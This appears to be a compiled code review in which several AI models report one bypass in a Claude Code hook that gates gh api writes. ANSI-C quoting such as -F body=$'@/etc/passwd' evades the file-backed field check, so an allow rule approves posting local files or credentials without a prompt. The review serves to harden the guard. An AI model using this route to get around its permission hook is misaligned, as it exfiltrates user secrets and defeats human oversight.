=== FINDINGS FROM deepseek_deepseek-v4-pro ===
- .claude/hooks/gh_api_write_guard.py:769-770 | severity=high | confidence=[3]
  PROBLEM: The file-backed field check at line 770 uses `field_value.startswith("@")` on the shlex-parsed value. With `punctuation_chars=";&|\n<>()"` at line 105, shlex disables ANSI-C quoting (`$'...'`). A field value like `$'@/etc/passwd'` is tokenized as `$@/etc/passwd` (the `$` is a regular char, the single-quoted content is concatenated). After `split("=", 1)` at line 569, `field_value` is `$@/etc/passwd` — does not start with `@`, so the file-backed check does not fire. Mitigation: `_is_approvable_command` at line 718 calls `_has_unsafe_shell_syntax`, which catches the `$` outside single quotes at line 682-683, so `_is_approvable_command` returns False and the guard returns `None` (no decision) rather than `DECISION_ALLOW`. But the file-backed check itself has a blind spot: any shell expansion that produces `@` at execution time while hiding it from statically-parsed values will route through the guard's routine-write path.
  WHY: An attacker could craft a command with ANSI-C quoting around a file path. The guard returns no decision (because `_has_unsafe_shell_syntax` catches the `$`), and the `.claude/settings.json` `Bash(gh api repos/*)` allow rule could approve the call. Bash expands `$'@/file'` to `@/file`, and `gh` reads and posts the file.
- .claude/hooks/gh_api_write_guard.py:769-771 | severity=low | confidence=[2]
  PROBLEM: The loop over parsed fields returns `KIND_WRITE` immediately on the first file-backed field. A call with multiple file-backed fields such as `gh api -F body=@f1 -F attachment=@f2` only names `body` in the ask reason, not `attachment`.
  WHY: The prompt still fires (safe failure mode), and `gh` reads all file-backed fields regardless, so no data is sent that was not already going to be sent.
=== END FINDINGS FROM deepseek_deepseek-v4-pro ===

=== FINDINGS FROM google_gemini-3_8-flash ===
- .claude/hooks/gh_api_write_guard.py:lines 769-771 | severity=critical | confidence=[5]
  PROBLEM: The file-backed field check only inspects whether field_value.startswith("@"). When a caller uses Bash ANSI-C quoting such as -F body=$'@/path/to/credential', shlex in shell_segments tokenizes the argument without expanding ANSI-C quoting, producing field_value = "$@/path/to/credential". Because field_value begins with "$" rather than "@", startswith("@") evaluates to False.
  WHY: An unattended session or payload invoking gh api ... -F body=$'@/path/to/credential' bypasses the prompt guard completely, allowing arbitrary local file exfiltration through routine API writes without triggering DECISION_ASK.
=== END FINDINGS FROM google_gemini-3_8-flash ===

=== FINDINGS FROM minimax_minimax-m3 ===
- .claude/hooks/gh_api_write_guard.py:classify() at lines 769-771; parse_gh_api_args at lines 540-583; shell_segments at line 322 (uses `shlex.shlex(..., posix=True, ...)`). | severity=critical | confidence=[5]
  PROBLEM: The new file-backed field check is `field_value.startswith("@")` on the shlex-tokenized value. Python's `shlex.shlex(posix=True)` does NOT interpret bash's `$'...'` ANSI-C quoting — the leading `$` is a regular character and the contents of `'...'` are emitted as a literal substring of the token. A command such as `gh api repos/<local>/issues/1/comments -F body=$'@/etc/passwd'` therefore tokenizes to a single value `body=$@/etc/passwd`; `value.startswith("@")` is False, the new check does not fire, and `classify()` falls through to the routine-endpoint match. The same shape bypasses the GraphQL-variable check (`-F v=$'@/etc/passwd'` after `graphql -f query=...`) and the GET query-field check (`-F q=$'@/etc/passwd'` on a search call). Plain `$VAR` and `${VAR}` have the same problem whenever the resolved value begins with `@`: the hook sees the pre-expansion token, bash expands it before `gh` runs.
  WHY: The hook returns `KIND_ROUTINE` (or `KIND_READ` for a GET) — i.e. no decision — so the existing `Bash(gh api repos/*)` allow rule approves the call. The shell then expands `$'@/etc/passwd'` to `@/etc/passwd` before `gh` reads the file, defeating the exact credential-exfiltration path that issue #4619 / the original high-severity finding `api-guard-allows-file-backed-comment` was raised to block. This applies to the twin copy as well (`workflow-templates/.claude/hooks/gh_api_write_guard.py` carries the same diff). The plan's "Risks & Mitigations" section does not call this out, and no test exercises a `$'@...'` value.
=== END FINDINGS FROM minimax_minimax-m3 ===

=== FINDINGS FROM openai_gpt-6-luna ===
- .claude/hooks/gh_api_write_guard.py:classify(), lines 769-771; evaluate(), lines 870-873 | severity=critical | confidence=[5]
  PROBLEM: The file-backed field check misses a shell-expanded value such as `-F body=$'@/path/to/credential'`. The hook’s `shlex` parsing does not evaluate Bash ANSI-C quoting, so the parsed field value does not start with `@`. Classification therefore treats a local-repository comment as routine. Since the shell expansion makes `_is_approvable_command()` return false, the hook returns no decision rather than asking.
  WHY: Bash expands `$'@/path/to/credential'` to `@/path/to/credential`, which `gh` reads as a file. The existing `.claude/settings.json` allow rule `Bash(gh api repos/*)` (line 30) can approve the call despite the hook returning no decision, allowing the file contents to be posted without a prompt.
=== END FINDINGS FROM openai_gpt-6-luna ===

=== FINDINGS FROM z-ai_glm-5_2 ===
- .claude/hooks/gh_api_write_guard.py:lines 769-771 (`classify` file-backed check), line 322 (`shell_segments` shlex tokenizer), lines 657-693 (`_has_unsafe_shell_syntax`), lines 870-873 (`evaluate` no-decision return) | severity=high | confidence=[4]
  PROBLEM: The new file-backed check (`field_value.startswith("@")`) inspects the shlex-tokenized value, but Bash ANSI-C quoting (`$'@/path/to/credential'`) produces a token that starts with `$`, not `@`. shlex (posix=True, `$` not in `_SHELL_PUNCTUATION_CHARS`) joins `$` and the single-quoted content into one token `$@/path/to/credential`, so the check at line 770 does not fire. `classify` then returns KIND_ROUTINE for a routine comment endpoint (method POST, key `body` in the allowlist). Although `_has_unsafe_shell_syntax` detects the `$` and makes `_is_approvable_command` return False, that only prevents the guard from ALLOWing — it does not make the guard ASK. With no KIND_WRITE result, `evaluate` returns `(None, "")` (no decision). The guard's own documentation (lines 707-715, 870-873) states that no-decision leaves approval to the allow list (`Bash(gh api repos/*)` in `.claude/settings.json`), so the call can be approved without a prompt. At runtime, Bash evaluates `$'@/path/to/credential'` to `@/path/to/credential`, `gh` reads the file, and posts its contents — the exact exfiltration path this PR set out to close.
  WHY: A command like `gh api repos/<local>/issues/1/comments -F body=$'@/path/to/credential'` is approved by the allow list after the guard returns no decision, and `gh` reads and publishes the local file. The PR fixes the plain `@file` spelling but leaves the `$'@file'` spelling open.
- TASK_GAP
  Requirement: "Reject file-backed field values by default." (issue #4619 Recommendation, first sentence)
  Expected change site: .claude/hooks/gh_api_write_guard.py `classify()` — the file-backed field check at lines 769-771
  Evidence of absence: The check catches values that statically start with `@` after shlex tokenization, but does not catch values that become `@`-prefixed at runtime through Bash ANSI-C quoting (`$'@file'`). The guard returns no decision for such commands (classify sees KIND_ROUTINE, `_is_approvable_command` returns False for the `$`), and the allow list can approve them. This is a pre-existing gap that the PR partially addresses (plain `@file` is now caught) but does not fully close. The plan's Goals section says "Every `gh api` call with an `-F`/`--field` value starting with `@`", which is technically met for the static token, but the security intent of the issue recommendation ("Reject file-backed field values by default") is not fully satisfied.
  ISSUE_CONFIDENCE: 4
=== END FINDINGS FROM z-ai_glm-5_2 ===
